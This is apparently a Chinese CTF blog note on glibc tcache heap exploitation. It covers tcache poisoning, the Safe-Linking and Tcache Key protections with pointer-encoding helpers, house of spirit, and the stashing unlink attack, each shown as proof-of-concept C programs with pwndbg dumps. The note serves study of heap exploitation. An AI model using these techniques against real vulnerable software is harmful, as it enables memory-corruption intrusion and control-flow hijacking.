---
title: tcache
published: 2026-03-19
description: "补充一下tcache"
image: ''
tags: [PWN，note,heap]
category: PWN
draft: false
---

## tcache基础与tcache poisoning

tcache是Glibc 2.26之后引入的，用来提高堆管理的速度

tcache引入了两个新的结构体：`tcache_entry`和`tcache_perthread_struct`

**tcache_entry：**`tcache_entry`用于链接空闲的chunk结构体，其中`next`指针指向下一个`大小相同`的chunk

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

```

这里需要注意的是next指向chunk的`data`部分，这和fastbin有一些不同，fastbin的fd指向的是下一个chunk的头指针。tcache_entry会复用空闲chunk的data 部分

**tcache_perthread_struct:**tcache_perthread_struct是用来管理tcache链表的，这个结构体位于heap段的起始位置，size大小为0x251,每一个thread都会维护一个`tcache_perthread_struct`结构体，一共有`TCACHE_MAX_BINS`个计数器`TCACHE_MAX_BINS`项tcache_entry

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];						//counts 记录了 tcache_entry 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk
  tcache_entry *entries[TCACHE_MAX_BINS];		//tcache_entry 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk
} tcache_perthread_struct;

# define TCACHE_MAX_BINS                64

static __thread tcache_perthread_struct *tcache = NULL;

```

 ![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/cf7fd07a7b6e50fb2aa73d40e232b166.jpeg#pic_center)

#### tcache poisoning

tcache poisoning主要的利用手段是覆盖tcache中的next成员变量，由于tcache_get()函数没有对next进行检查，所以理论上来讲如果我们将next中的地址进行替换，不需要伪造任何chunk结构即可实现malloc到任何地址

##### libc 2.29

Tcache Key

在每个空闲 chunk 的 `fd` 指针旁边（即原 `bk` 指针的位置），你都能看到一个一模一样的神秘数值：

- `0x5555555592a8`: `0x313f315503c525e4`
- `0x555555559338`: `0x313f315503c525e4`

这是 **Tcache Key**（在 glibc 2.29 引入）

当一个 chunk 被放入 Tcache 时，glibc 会在这个位置写入一个随机生成的 8 字节密钥（每个程序的生命周期内这个密钥是固定的，存放在 `tcache_perthread_struct` 中

**它的作用是防御 Tcache Double-Free：** 如果在程序执行 `free(p)` 时，堆管理器发现 `p` 的 key 位置存放的值与当前的 Tcache Key 相等，它就会遍历对应的 Tcache 链表。如果发现这个 chunk 已经在链表中了，就会直接报 `double free or corruption (fasttop)` 的 crash，从而阻止攻击者通过连续两次 free 同一个 chunk 来构造循环链表。

##### libc 2.32

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559290
Size: 0x90 (with flag bits: 0x91)
fd: 0x555555559

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559320
Size: 0x90 (with flag bits: 0x91)
fd: 0x55500000c7f9

Top chunk | PREV_INUSE
Addr: 0x5555555593b0
Size: 0x20c50 (with flag bits: 0x20c51)

pwndbg> x/50gx 0x555555559290
0x555555559290: 0x0000000000000000      0x0000000000000091		--> chunk a
0x5555555592a0: 0x0000000555555559      0x313f315503c525e4
0x5555555592b0: 0x0000000000000000      0x0000000000000000
0x5555555592c0: 0x0000000000000000      0x0000000000000000
0x5555555592d0: 0x0000000000000000      0x0000000000000000
0x5555555592e0: 0x0000000000000000      0x0000000000000000
0x5555555592f0: 0x0000000000000000      0x0000000000000000
0x555555559300: 0x0000000000000000      0x0000000000000000
0x555555559310: 0x0000000000000000      0x0000000000000000
0x555555559320: 0x0000000000000000      0x0000000000000091		--> chunk b
0x555555559330: 0x000055500000c7f9      0x313f315503c525e4
0x555555559340: 0x0000000000000000      0x0000000000000000
0x555555559350: 0x0000000000000000      0x0000000000000000
0x555555559360: 0x0000000000000000      0x0000000000000000
0x555555559370: 0x0000000000000000      0x0000000000000000
0x555555559380: 0x0000000000000000      0x0000000000000000
0x555555559390: 0x0000000000000000      0x0000000000000000
0x5555555593a0: 0x0000000000000000      0x0000000000000000
0x5555555593b0: 0x0000000000000000      0x0000000000020c51
```

在libc 2.32之后，堆管理器引入了**Safe-Linking** 和 **Tcache Key**保护机制：

1. Safe-Linking

   我们观察释放的chunk的fd：

   chunk a：0x0000000555555559

   chunk b：0x000055500000c7f9 

   解密过程：

   ```python
   Chunk b 的 fd 指针存放在地址 0x555555559330
   将其右移 12 位（也就是去掉最后三个十六进制位），得到 0x555555559
   内存中存储的加密值为 0x55500000c7f9
   0x55500000c7f9 ^ 0x0000000555555559 = 0x5555555592a0 即chunk a的数据区
   
   Chunk a 的 fd 指针存放在地址 0x5555555592a0 右移 12 位得到 0x555555559
   内存中的加密值为 0x0000000555555559
   0x0000000555555559 ^ 0x0000000555555559 = 0x0000000000000000
   解密结果为 0，说明 Chunk a 是这个 Tcache 链表上的最后一个块。
   
   def protect_ptr(pos, ptr):
       """
       加密指针：用于在利用漏洞覆盖 fd 时，计算出需要写入的加密值
       :param pos: 存放该 fd 指针的内存地址 (即 堆块起始地址 + 0x10)
       :param ptr: 你真正想要 tcache 指向的目标地址 (如栈地址、__free_hook 等)
       :return: 应该写入内存的加密后数据
       """
       return (pos >> 12) ^ ptr
   
   def reveal_ptr(pos, val):
       """
       解密指针：用于在泄露了堆内存后，还原出真实的下一跳地址
       :param pos: 存放该 fd 指针的内存地址
       :param val: 从内存中泄露/读取出的加密值
       :return: 真实的堆块物理地址
       """
       return (pos >> 12) ^ val
   ```

#### tcache house of spirit

tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，如果我们构造一个size符合tcache bin size的fake_chunk，那么理论上讲其实可以将任意地址作为chunk进行释放。这里就直接采用wiki上面列出的例子进行讲解了：
```c
  1 //gcc -g -no-pie hollk.c -o hollk
  2 //patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk
  3 //patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk
  4 #include <stdio.h>
  5 #include <stdlib.h>
  6 #include <assert.h>
  7 
  8 int main()
  9 {
 10         setbuf(stdout, NULL);
 11 
 12         malloc(1);
 13 
 14         unsigned long long *a;
 15         unsigned long long fake_chunks[10];
 16 
 17         printf("fake_chunk addr is %p\n", &fake_chunks[0]);
 18 
 19         fake_chunks[1] = 0x40; 
 20 
 21         a = &fake_chunks[2];
 22 
 23         free(a);
 24 
 25         void *b = malloc(0x30);
 26         printf("malloc(0x30): %p\n", b);
 27 
 28         assert((long)b == (long)&fake_chunks[2]);
 29 }

```

我们简单的说明一下这个程序的执行流程：首先使用setbuf()函数进行初始化 ，然后创建了一个堆块，这个堆块的作用其实是为了防止后面的chunk与top chunk合并的。接下来定义了一个指针变量a，还定义了一个整型数组fake_chunk[10]。接下来打印了fake_chunk的起始地址，将fake_chunk[1]中的内容修改成了0x40。接下来将fake_chunk[2]所在地址赋给指针变量a，然后释放a。接着重新申请一个size为0x40大小的chunk，并将其malloc地址赋给指针变量b，最后打印出chunk_b的malloc地址
```c
This region contains one fake chunk. It's size field is placed at 0x7fffffffd848
```

可以看到fake_chunk[]的起始地址为`0x7fffffffd840`,将fake_chunk的size设置为0x40，当我们释放fake_chunk后，bin中情况如下：

```c
pwndbg> bins
tcachebins
0x40 [  1]: 0x7fffffffd850 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
empty
```

fake_chunk已经成功进入tcache中，当我们下次进行malloc一个大小为0x40的chunk时，便可以在栈中申请一个大小为0x40的chunk，进而控制程序流，不过目前感觉有点鸡肋，需要的条件太多了

#### tcache stashing unlink attack

首先从名字就可以看出这种方法与unlink有关，这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中**只对第一个bin进行了完整性检查**，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址

```c
  1 //gcc -g -no-pie hollk.c -o hollk
  2 //patchelf --set-rpath 路径/2.27-3ubuntu1_amd64/ hollk
  3 //patchelf --set-interpreter 路径/2.27-3ubuntu1_amd64/ld-linux-x86-64.so.2 hollk
  4 #include <stdio.h>
  5 #include <stdlib.h>
  6 #include <assert.h>
  7 
  8 int main(){
  9     unsigned long stack_var[0x10] = {0};
 10     unsigned long *chunk_lis[0x10] = {0};
 11     unsigned long *target;
 12 
 13     setbuf(stdout, NULL);
 14     
 15     printf("stack_var addr is:%p\n",&stack_var[0]);
 16     printf("chunk_lis addr is:%p\n",&chunk_lis[0]);
 17     printf("target addr is:%p\n",(void*)target);
 18 
 19     stack_var[3] = (unsigned long)(&stack_var[2]);
 20 
 21     for(int i = 0;i < 9;i++){
 22         chunk_lis[i] = (unsigned long*)malloc(0x90);
 23     }
 24 
 25     for(int i = 3;i < 9;i++){
 26         free(chunk_lis[i]);
 27     }
 28     
 29     free(chunk_lis[1]);
 30     free(chunk_lis[0]);
 31     free(chunk_lis[2]);
 32     
 33     malloc(0xa0);
 34     malloc(0x90);
 35     malloc(0x90);
 36     
 37     chunk_lis[2][1] = (unsigned long)stack_var;
 38     calloc(1,0x90);
 39 
 40     target = malloc(0x90);
 41 
 42     printf("target now: %p\n",(void*)target);
 43 
 44     assert(target == &stack_var[2]);
 45     return 0;
 46 }

```

简单的描述一下这个程序的执行流程：首先创建了一个数组stack_var[0x10]，一个指针数组chunk_lis[0x10]，一个指针target。接下来调用setbuf()函数进行初始化。接着调用printf()函数打印stack_var、chunk_lis首地址及target的地址。

接下来将stack_var[2]所在地址放在stack_var[3]中。接着循环创建8个size为0xa0大小的chunk，并将八个chunk的malloc指针依序放进chunk_lis[]中。然后根据chunk_lis[]中的堆块malloc指针循环释放6个已创建的chunk。接下来依序释放chunk_lis[1]、chunk_lis[0]、chunk_lis[2]中malloc指针指向的chunk。然后连续创建三个chunk，第一个size为0xb0，第二个size为0xa0，三个size为0xa0。接下来将chunk_lis\[2]\[1]位置中的内容修改成stack_var的起始地址，接着调用calloc()函数申请一个size为0xa0大小的chunk。最后申请一个size为0xa0大小的chunk，并将其malloc指针赋给target变量，并打印target



首先创建8个大小为0xa0的chunk，然后释放后5个进入tcache中，接下来依序释放chunk_lis[1]、chunk_lis[0]、chunk_lis[2]中malloc指针指向的chunk。此时由于tcache中0xa0已满，chunk0，chunk2释放到unsortedbin中

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x555555559290
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x555555559330
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x5555555593d0
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x555555559470
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x555555559510
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x5555555595b0
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x555555559650
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x5555555596f0
Size: 0xa0 (with flag bits: 0xa1)
    
    
    
    
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555559290
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x7ffff7e1ace0
bk: 0x5555555593d0

Free chunk (tcachebins)
Addr: 0x555555559330
Size: 0xa0 (with flag bits: 0xa0)
fd: 0x55500000c2f9

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5555555593d0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x555555559290
bk: 0x7ffff7e1ace0

Free chunk (tcachebins)
Addr: 0x555555559470
Size: 0xa0 (with flag bits: 0xa0)
fd: 0x555555559

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559510
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c1d9

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5555555595b0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c079

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559650
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c099

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5555555596f0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c339

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559790
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c259

Top chunk | PREV_INUSE
Addr: 0x555555559830
Size: 0x207d0 (with flag bits: 0x207d1)    
```

然后连续创建三个chunk，第一个size为`0xb0`，第二个size为`0xa0`，三个size为`0xa0`,第一个malloc(0xa0)是为了将两个freed chunk放入small bin中，接下来的两个malloc(0x90)则是为了在tcache中腾出两个位置

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x290 (with flag bits: 0x291)

Free chunk (smallbins) | PREV_INUSE
Addr: 0x555555559290
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x7ffff7e1ad70
bk: 0x5555555593d0

Allocated chunk
Addr: 0x555555559330
Size: 0xa0 (with flag bits: 0xa0)

Free chunk (smallbins) | PREV_INUSE
Addr: 0x5555555593d0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x555555559290
bk: 0x7ffff7e1ad70

Free chunk (tcachebins)
Addr: 0x555555559470
Size: 0xa0 (with flag bits: 0xa0)
fd: 0x555555559

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559510
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c1d9

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5555555595b0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c079

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x555555559650
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c099

Free chunk (tcachebins) | PREV_INUSE
Addr: 0x5555555596f0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x55500000c339

Allocated chunk | PREV_INUSE
Addr: 0x555555559790
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x555555559830
Size: 0xb0 (with flag bits: 0xb1)

Top chunk | PREV_INUSE
Addr: 0x5555555598e0
Size: 0x20720 (with flag bits: 0x20721)
```

接下来修改chunk3中bk地址为stack地址，这个时候我们可以看一下bin中的状况：

```c
pwndbg> bins
tcachebins
0xa0 [  5]: 0x555555559700 —▸ 0x555555559660 —▸ 0x5555555595c0 —▸ 0x555555559520 —▸ 0x555555559480 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
0xa0 [corrupted]
FD: 0x5555555593d0 —▸ 0x555555559290 —▸ 0x7ffff7e1ad70 (main_arena+240) ◂— 0x5555555593d0
BK: 0x555555559290 —▸ 0x5555555593d0 —▸ 0x7fffffffd760 —▸ 0x7fffffffd770 ◂— 0
largebins
empty
```

由于chunk3是small bin中最后一个chunk，且chunk3的bk被修改成了stack_var的头指针，所以，stack_var会被认为是紧跟着chunk3之后释放的一个chunk：![](https://i-blog.csdnimg.cn/blog_migrate/6158ffe8799d1a3efe3a2f4931e29d02.png)

那么接下来我们调用calloc函数申请一个size为0xa0大小的chunk：

```c
pwndbg> bins
tcachebins
0xa0 [  7]: 0x7fffffffd770 —▸ 0x5555555593e0 —▸ 0x555555559700 —▸ 0x555555559660 —▸ 0x5555555595c0 —▸ 0x555555559520 —▸ 0x555555559480 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
0xa0 [corrupted]
FD: 0x5555555593d0 ◂— 0x55500000c259
BK: 0x7fffffffd770 ◂— 0
largebins
empty
```



这里说明一下为什么要使用`calloc`进行申请chunk，这是因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk1
这个时候就到了前面理论部分描述的内容了：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk3和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var(0x7ffffffddf0)开始顺着bk链接到 tcachebin 中 ，在这个过程中只对第一个 chunk3进行了完整性检查，后面的stack_var的检查缺失。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中
最后申请一个size为`0xa0`大小的chunk，并将其malloc指针赋给target变量，并打印target：

```c
pwndbg>
As you can see, next malloc(0x90) will return the region our fake chunk: 0x7fffffffd770
```

我们成功在stack中malloc一个chunk
